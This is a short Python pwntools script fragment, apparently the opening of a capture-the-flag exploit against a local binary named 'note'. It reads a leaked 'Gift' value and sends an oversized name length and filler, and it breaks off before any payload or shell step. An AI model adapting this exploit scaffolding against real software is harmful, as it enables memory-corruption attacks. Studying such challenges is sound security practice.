from pwn import *

r = process('./note')
v6 = r.recvuntil('How long is your name:').split('Gift ')[1].split('\n')[0]

r.sendline(str(0x150))
r.recvuntil('Please input your name')
r.sendline('a' * 0x140)
